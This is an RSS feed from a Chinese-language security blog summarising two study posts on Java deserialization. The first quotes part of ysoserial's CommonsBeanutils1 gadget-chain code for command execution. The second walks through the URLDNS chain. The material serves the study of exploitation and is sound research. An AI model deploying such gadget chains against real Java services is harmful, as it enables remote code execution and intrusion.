<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Java Deserialization on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/</link><description>Recent content in Java Deserialization on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 12 Jan 2024 17:03:07 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description>概述 在ysoserial中实现了CommonsBeanutils1反序列化链，可以利用这个链执行代码。
细节 在ysoserial中实现CommonsBeanutils1代码如下，首先new BeanComparator/PriorityQueue对象，在PriorityQueue对象内添加两个int对象，而后通过反射修改property字段存储的值
public class CommonsBeanutils1 implements ObjectPayload&amp;lt;Object&amp;gt; { public Object getObject(final String command) throws Exception { final Object templates = Gadgets.createTemplatesImpl(command); // mock method name until armed final BeanComparator comparator = new BeanComparator(&amp;#34;lowestSetBit&amp;#34;); // create queue with numbers and basic comparator final PriorityQueue&amp;lt;Object&amp;gt; queue = new PriorityQueue&amp;lt;Object&amp;gt;(2, comparator); // stub data for replacement later queue.add(new BigInteger(&amp;#34;1&amp;#34;)); queue.add(new BigInteger(&amp;#34;1&amp;#34;)); // switch method called by comparator Reflections.setFieldValue(comparator, &amp;#34;property&amp;#34;, &amp;#34;outputProperties&amp;#34;); // switch contents of queue final Object[] queueArray = (Object[]) Reflections.</description></item><item><title>JAVA URL DNS 研究</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</link><pubDate>Mon, 08 Jan 2024 16:57:37 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</guid><description>前言
初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_whipper.0p@icloud.com
URL类DNS请求 使用URL.equals会发起DNS请求
public class urltest { public static void main(String[] args) throws MalformedURLException { System.out.println(&amp;#34;hello &amp;#34;); URL u = new URL(&amp;#34;http://www.baidu.com&amp;#34;); URL u1 = new URL(&amp;#34;http://www.baidu.com&amp;#34;); System.out.println(u.equals(u1)); } } 跟进代码，equals代码如下，
protected boolean equals(URL u1, URL u2) { String ref1 = u1.getRef(); String ref2 = u2.getRef(); return (ref1 == ref2 || (ref1 != null &amp;amp;&amp;amp; ref1.equals(ref2))) &amp;amp;&amp;amp; sameFile(u1, u2); } 判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。
protected boolean sameFile(URL u1, URL u2) { // Compare the protocols.</description></item></channel></rss>